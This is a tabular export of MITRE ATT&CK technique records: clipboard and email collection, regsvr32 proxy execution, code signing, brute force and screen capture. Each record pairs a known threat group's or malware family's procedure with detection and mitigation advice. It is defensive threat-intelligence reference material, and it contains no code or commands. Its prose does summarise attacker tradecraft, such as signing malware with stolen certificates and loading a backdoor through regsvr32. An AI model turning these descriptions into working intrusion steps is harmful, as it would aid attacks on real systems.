809,"['Access to the clipboard is a legitimate function of many applications on a Windows system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.']",[],[],[],['API monitoring'],['[[Software/S0050|CosmicDuke]] copies and exfiltrates the clipboard contents every 30 seconds.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Instead of blocking software based on clipboard capture behavior, identify potentially malicious software that may contain this functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1115'],['Clipboard Data'],https://attack.mitre.org/wiki/Technique/T1115
810,"['There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for [[Exfiltration]], unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']","['[[Group/G0006|APT1]] uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived.[[CiteRef::Mandiant APT1]]']",['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Collection'],['Technique/T1114'],['Email Collection'],https://attack.mitre.org/wiki/Technique/T1114
811,"['There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for [[Exfiltration]], unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']",['[[Software/S0093|Backdoor.Oldrea]] collects address book information from Outlook.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: Backdoor.Oldrea, Havex",['Collection'],['Technique/T1114'],['Email Collection'],https://attack.mitre.org/wiki/Technique/T1114
812,"['There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for [[Exfiltration]], unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']",['[[Software/S0050|CosmicDuke]] searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1114'],['Email Collection'],https://attack.mitre.org/wiki/Technique/T1114
813,"['There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for [[Exfiltration]], unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']",['Some [[Software/S0053|SeaDuke]] samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[[CiteRef::Symantec Seaduke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Collection'],['Technique/T1114'],['Email Collection'],https://attack.mitre.org/wiki/Technique/T1114
814,['Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.'],"['Process whitelisting', 'Anti-virus']",[],['Casey Smith'],"['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']",['[[Software/S0021|Derusbi]] variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.[[CiteRef::ThreatGeek Derusbi Converge]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Derusbi,"['Defense Evasion', 'Execution']",['Technique/T1117'],['Regsvr32'],https://attack.mitre.org/wiki/Technique/T1117
815,['Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.'],"['Process whitelisting', 'Anti-virus']",[],['Casey Smith'],"['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']",['[[Group/G0009|Deep Panda]] has used regsvr32.exe to execute a server variant of [[Software/S0021|Derusbi]] in victim networks.[[CiteRef::RSA Shell Crew]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Execution']",['Technique/T1117'],['Regsvr32'],https://attack.mitre.org/wiki/Technique/T1117
816,['Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.'],"['Process whitelisting', 'Anti-virus']",[],['Casey Smith'],"['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']",['[[Software/S0021|Derusbi]] variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.[[CiteRef::ThreatGeek Derusbi Converge]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Derusbi,"['Defense Evasion', 'Execution']",['Technique/T1117'],['Regsvr32'],https://attack.mitre.org/wiki/Technique/T1117
817,['Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.'],"['Process whitelisting', 'Anti-virus']",[],['Casey Smith'],"['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']",['[[Group/G0050|APT32]] created a [[Technique/T1053|Scheduled Task]] that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Execution']",['Technique/T1117'],['Regsvr32'],https://attack.mitre.org/wiki/Technique/T1117
818,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Software/S0148|RTM]] samples have been signed with a code-signing certificates.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],Software: RTM,['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
819,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Group/G0010|Turla]] has used valid digital certificates from Sysprint AG to sign its [[Software/S0091|Epic]] dropper.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],"Software: Epic, Tavdig, ...",['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
820,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Group/G0044|Winnti Group]] used stolen certificates to sign its malware.[[CiteRef::Kaspersky Winnti April 2013]]'],['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],[],['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
821,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Group/G0039|Suckfly]] has used stolen certificates to sign its malware.[[CiteRef::Symantec Suckfly March 2016]]'],['Suckfly'],['Suckfly'],['G0039'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],[],['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
822,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Group/G0012|Darkhotel]] has used code-signing certificates on its malware that are either forged due to weak keys or stolen.[[CiteRef::Kaspersky Darkhotel]]'],['Darkhotel'],['Darkhotel'],['G0012'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],[],['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
823,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Software/S0144|ChChes]] samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::JPCERT ChChes Feb 2017]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
824,['Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.'],['Windows User Account Control'],[],[],['Binary file metadata'],['[[Group/G0021|Molerats]] has used forged Microsoft code-signing certificates on malware.[[CiteRef::FireEye Operation Molerats]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],['Process whitelisting and trusted publishers to verify authenticity of software can help prevent signed malicious or untrusted code from executing on a system.[[CiteRef::NSA MS AppLocker]][[CiteRef::TechNet Trusted Publishers]][[CiteRef::Securelist Digital Certificates]]'],"['MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",[],[],[],['Defense Evasion'],['Technique/T1116'],['Code Signing'],https://attack.mitre.org/wiki/Technique/T1116
825,"['It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. \n\nMonitor authentication logs for system and application login failures of [[Technique/T1078|Valid Accounts]]. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\nAlso monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.']",[],[],['John Strand'],['Authentication logs'],['[[Software/S0056|Net Crawler]] uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],['Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Use multifactor authentication. Follow best practices for mitigating access to [[Technique/T1078|Valid Accounts]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net Crawler, NetC",['Credential Access'],['Technique/T1110'],['Brute Force'],https://attack.mitre.org/wiki/Technique/T1110
826,"['It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. \n\nMonitor authentication logs for system and application login failures of [[Technique/T1078|Valid Accounts]]. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\nAlso monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.']",[],[],['John Strand'],['Authentication logs'],"[""[[Group/G0010|Turla]] may attempt to connect to systems within a victim's network using <code>net use</code> commands and a predefined list or collection of passwords.[[CiteRef::Kaspersky Turla]]""]",['Turla'],"['Turla', 'Waterbug']",['G0010'],['Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Use multifactor authentication. Follow best practices for mitigating access to [[Technique/T1078|Valid Accounts]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Credential Access'],['Technique/T1110'],['Brute Force'],https://attack.mitre.org/wiki/Technique/T1110
827,"['It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. \n\nMonitor authentication logs for system and application login failures of [[Technique/T1078|Valid Accounts]]. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\nAlso monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.']",[],[],['John Strand'],['Authentication logs'],"['[[Group/G0032|Lazarus Group]] malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Use multifactor authentication. Follow best practices for mitigating access to [[Technique/T1078|Valid Accounts]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Credential Access'],['Technique/T1110'],['Brute Force'],https://attack.mitre.org/wiki/Technique/T1110
828,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']","[""Malware used by [[Group/G0043|Group5]] is capable of watching the victim's screen.[[CiteRef::Citizen Lab Group5]]""]",['Group5'],['Group5'],['G0043'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
829,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0151|HALFBAKED]] can obtain screenshots from the victim.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: HALFBAKED,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
830,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0147|Pteranodon]] can capture screenshots at a configurable interval.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Pteranodon,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
831,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0128|BADNEWS]] has a command to take a screenshot and send it to the C2 server.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BADNEWS,['Collection'],['Technique/T1113'],['Screen Capture'],https://attack.mitre.org/wiki/Technique/T1113
832,"['Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0004|TinyZBot]] contains screen capture functionality.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows 